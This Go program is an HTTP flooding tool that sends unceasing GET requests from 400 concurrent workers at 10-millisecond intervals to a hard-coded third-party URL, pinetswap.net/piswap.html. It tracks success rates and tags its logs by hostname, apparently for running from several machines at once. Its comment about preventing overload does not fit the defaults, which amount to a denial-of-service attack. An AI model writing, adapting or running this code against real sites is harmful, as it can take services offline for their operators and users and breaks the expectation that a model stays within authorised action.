package main

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Stats to track requests
type Stats struct {
	totalRequests int64
	successCount  int64
	errorCount    int64
}

// makeRequest performs an HTTP GET request to the given URL
func makeRequest(ctx context.Context, url string, stats *Stats, requestID int64, hostname string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	start := time.Now()
	resp, err := client.Get(url)
	duration := time.Since(start)

	atomic.AddInt64(&stats.totalRequests, 1)

	if err != nil {
		atomic.AddInt64(&stats.errorCount, 1)
		fmt.Printf("[%s] Request %d: Error - %v (took %v)\n", hostname, requestID, err, duration)
		return
	}
	defer resp.Body.Close()

	atomic.AddInt64(&stats.successCount, 1)
	// Only log successful requests occasionally to reduce noise
	if requestID%100 == 0 {
		fmt.Printf("[%s] Request %d: Status %d - %s (took %v)\n", 
			hostname, requestID, resp.StatusCode, resp.Status, duration)
	}
}

// worker continuously makes requests until context is cancelled
func worker(ctx context.Context, url string, stats *Stats, workerID int, requestCounter *int64, delay time.Duration, hostname string) {
	for {
		select {
		case <-ctx.Done():
			fmt.Printf("[%s] Worker %d stopping...\n", hostname, workerID)
			return
		default:
			requestID := atomic.AddInt64(requestCounter, 1)
			makeRequest(ctx, url, stats, requestID, hostname)
			
			// Configurable delay to prevent overwhelming the server
			time.Sleep(delay)
		}
	}
}

// printStats periodically prints statistics
func printStats(ctx context.Context, stats *Stats, interval time.Duration, hostname string) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			total := atomic.LoadInt64(&stats.totalRequests)
			success := atomic.LoadInt64(&stats.successCount)
			errors := atomic.LoadInt64(&stats.errorCount)
			
			fmt.Printf("\n[%s] === STATS ===\n", hostname)
			fmt.Printf("[%s] Total Requests: %d\n", hostname, total)
			fmt.Printf("[%s] Successful: %d\n", hostname, success)
			fmt.Printf("[%s] Errors: %d\n", hostname, errors)
			if total > 0 {
				successRate := float64(success) / float64(total) * 100
				fmt.Printf("[%s] Success Rate: %.2f%%\n", hostname, successRate)
			}
			fmt.Printf("[%s] =============\n\n", hostname)
		}
	}
}

// Helper functions for environment variables
func getEnv(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

func getEnvInt(key string, defaultValue int) int {
	if value := os.Getenv(key); value != "" {
		if intVal, err := strconv.Atoi(value); err == nil {
			return intVal
		}
	}
	return defaultValue
}

func getEnvDuration(key string, defaultValue time.Duration) time.Duration {
	if value := os.Getenv(key); value != "" {
		if duration, err := time.ParseDuration(value); err == nil {
			return duration
		}
	}
	return defaultValue
}

func main() {
	// Get configuration from environment variables or use defaults
	domain := getEnv("TARGET_URL", "https://pinetswap.net/piswap.html")
	numWorkers := getEnvInt("NUM_WORKERS", 400)
	requestDelay := getEnvDuration("REQUEST_DELAY", 10*time.Millisecond)
	statsInterval := getEnvDuration("STATS_INTERVAL", 5*time.Second)
	
	// Get hostname for logging
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	
	fmt.Printf("[%s] Starting %d concurrent workers making continuous requests to: %s\n", hostname, numWorkers, domain)
	fmt.Printf("[%s] Request delay: %v, Stats interval: %v\n", hostname, requestDelay, statsInterval)
	fmt.Println("Press Ctrl+C to stop gracefully...")
	fmt.Println("Stats will be printed every interval.\n")

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	
	// Handle interrupt signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	
	var wg sync.WaitGroup
	stats := &Stats{}
	var requestCounter int64

	// Start stats printer
	go printStats(ctx, stats, statsInterval, hostname)

	// Start all worker goroutines
	for i := 1; i <= numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			worker(ctx, domain, stats, workerID, &requestCounter, requestDelay, hostname)
		}(i)
	}

	// Wait for interrupt signal
	<-sigChan
	fmt.Println("\nShutdown signal received. Stopping all workers...")
	
	// Cancel context to stop all workers
	cancel()
	
	// Wait for all workers to finish
	wg.Wait()
	
	// Print final stats
	total := atomic.LoadInt64(&stats.totalRequests)
	success := atomic.LoadInt64(&stats.successCount)
	errors := atomic.LoadInt64(&stats.errorCount)
	
	fmt.Printf("\n=== FINAL STATS ===\n")
	fmt.Printf("Total Requests: %d\n", total)
	fmt.Printf("Successful: %d\n", success)
	fmt.Printf("Errors: %d\n", errors)
	if total > 0 {
		successRate := float64(success) / float64(total) * 100
		fmt.Printf("Success Rate: %.2f%%\n", successRate)
	}
	fmt.Printf("==================\n")
	
	fmt.Println("All workers stopped. Goodbye!")
}